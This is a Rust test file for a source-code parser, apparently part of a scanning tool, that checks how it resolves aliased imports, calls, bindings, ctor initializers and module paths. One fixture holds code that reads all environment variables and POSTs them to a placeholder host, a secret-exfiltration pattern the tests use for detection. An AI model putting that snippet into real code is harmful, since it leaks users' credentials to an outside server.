use crate::{OpenOptions, Symbol};
use std::path::Path;
#[test]
fn rust_grouped_aliases_scoped_calls_and_let_binds() {
    let parsed=OpenOptions::new().path(Path::new("lib.rs")).open(br#"
use std::{env::{vars as environment}, fs};
use reqwest::blocking::Client;
fn run() { let data=environment(); let client=Client::new(); client.post("https://example.invalid").json(&data).send(); }
"#);
    let imports = parsed
        .symbols()
        .iter()
        .filter_map(|s| {
            if let Symbol::Import { name, alias, .. } = s {
                Some((name.as_str(), alias.as_deref()))
            } else {
                None
            }
        })
        .collect::<Vec<_>>();
    assert!(
        imports.contains(&("std::env::vars", Some("environment"))),
        "{imports:?}"
    );
    assert!(imports.contains(&("std::fs", None)), "{imports:?}");
    assert!(
        imports.contains(&("reqwest::blocking::Client", None)),
        "{imports:?}"
    );
    assert!(
        parsed
            .symbols()
            .iter()
            .any(|s| matches!(s,Symbol::Call{target:Some(n),..} if n=="std::env::vars"))
    );
    assert!(parsed.symbols().iter().any(
        |s| matches!(s,Symbol::Call{target:Some(n),..} if n=="reqwest::blocking::Client::new")
    ));
    assert!(
        parsed
            .symbols()
            .iter()
            .any(|s| matches!(s,Symbol::Bind{target,..} if target=="data"))
    );
}

/// An item's attributes are the run of attributes directly before it,
/// however long, tracked as the walk passes them: asking each node for its
/// previous siblings walks the run again per attribute.
#[test]
fn long_attribute_runs_gate_and_mark_their_item() {
    let run = "#[allow(dead_code)]\n".repeat(5_000);
    let source = format!(
        "{run}#[ctor::ctor]\nfn start() {{}}\n{run}#[cfg(test)]\nmod tests;\n#[path = \"x.rs\"]\nmod other;\n"
    );
    let parsed = OpenOptions::new()
        .path(Path::new("lib.rs"))
        .open(source.as_bytes());
    let values = parsed.values();
    assert_eq!(
        values.get("source.rust.initializers"),
        Some(&serde_json::json!(["ctor"]))
    );
    assert_eq!(
        values.get("source.rust.modules").map(ToString::to_string),
        Some(r#"[{"name":"other","path":"x.rs","prefix":""}]"#.to_string())
    );
}

/// Module paths nest with inline modules and are restored after them.
#[test]
fn module_prefixes_follow_inline_modules() {
    let parsed = OpenOptions::new()
        .path(Path::new("lib.rs"))
        .open(b"mod a { mod b { mod c; } mod d; }\nmod e;\n");
    let modules = parsed.values().get("source.rust.modules").cloned();
    assert_eq!(
        modules,
        Some(serde_json::json!([
            {"name": "c", "prefix": "a/b/", "path": null},
            {"name": "d", "prefix": "a/", "path": null},
            {"name": "e", "prefix": "", "path": null},
        ]))
    );
}

/// An import path is copied into every call through its alias, so a path
/// longer than [`super::super::MAX_ALIAS_BYTES`] qualifies none of them.
#[test]
fn long_import_paths_do_not_qualify_calls() {
    let path = "a".repeat(super::super::MAX_ALIAS_BYTES);
    let source = format!("use {path}::b as X;\nuse c::d as Y;\nfn main() {{ X::f(); Y::g(); }}\n");
    let parsed = OpenOptions::new()
        .path(Path::new("lib.rs"))
        .open(source.as_bytes());
    let targets: Vec<_> = parsed
        .symbols()
        .iter()
        .filter_map(|s| match s {
            Symbol::Call { target, .. } => target.as_deref(),
            _ => None,
        })
        .collect();
    assert!(targets.contains(&"X::f"), "{targets:?}");
    assert!(targets.contains(&"c::d::g"), "{targets:?}");
}
